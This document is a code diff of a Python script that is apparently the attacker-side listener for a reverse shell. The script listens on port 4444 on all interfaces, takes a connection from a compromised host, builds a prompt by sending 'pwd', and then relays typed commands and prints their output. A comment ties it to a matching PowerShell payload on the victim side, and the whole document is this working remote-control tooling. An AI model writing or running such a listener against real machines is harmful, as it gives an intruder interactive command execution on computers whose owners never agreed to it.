@@ -1,39 +1,55 @@
 import socket
 
-
 def listener(ip, port):
     port = int(port)
-
-    if ip == "0.0.0.0":
-        print("[*] Listening on ALL interfaces...")
-
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    try:
-        server.bind((ip, port))
-    except OSError as e:
-        print(f"[-] Failed to bind: {e}")
-        return
-
+    server.bind((ip, port))
     server.listen(1)
     print(f"[*] Listening on {ip}:{port}...")
-
+    
     client, addr = server.accept()
-    print(f"[+] Connection received from {addr}")
+    print(f"[*] Connection received from {addr[0]}:{addr[1]}")
+    
+    client.sendall(b"pwd\n")
+    prompt = client.recv(1024).decode(errors='ignore').strip() + " >>> "
 
-    try:
-        while True:
-            command = input("\033[38;5;57mDracula_shell $> \033[0m ").strip()
-            if command.lower() in ["exit", "quit"]:
-                client.send(b"exit")
-                client.close()
+    
+    while True:
+        try:
+            cmd = input(prompt)
+            if not cmd:
+                continue
+            elif cmd.lower() in ["exit", "quit"]:
+                print("[*] Closing connection...")
+                client.sendall(b"exit\n")
                 break
+            
+            client.sendall(cmd.encode() + b"\n")
+            
+            output = ""
+            while True:
+                chunk = client.recv(1024).decode(errors='ignore')
+                if not chunk:
+                    break
+                output += chunk
+                if output.endswith("\n"):
+                    break
+            
+            lines = output.split("\n")
+            
+            client.sendall(b"pwd\n")
+            prompt = client.recv(1024).decode(errors='ignore').strip() + " >>> "
+            
+            print("\n".join(lines[:-2]))
+        except Exception as e:
+            print(f"[!] Error: {e}")
+            break
+    
+    client.close()
+    server.close()
+    print("[*] Listener stopped.")
 
-            client.send(command.encode() + b"\n")
-            response = client.recv(4096).decode(errors="ignore")
-            print("\n\033[38;5;69m",response)
-    except (ConnectionResetError, KeyboardInterrupt):
-        print("[-] Connection lost.")
-    finally:
-        client.close()
-        server.close()
+if __name__ == "__main__":
+    LISTEN_IP = "0.0.0.0"  # Change if needed
+    LISTEN_PORT = 4444  # Match PowerShell script
+    listener(LISTEN_IP, LISTEN_PORT)
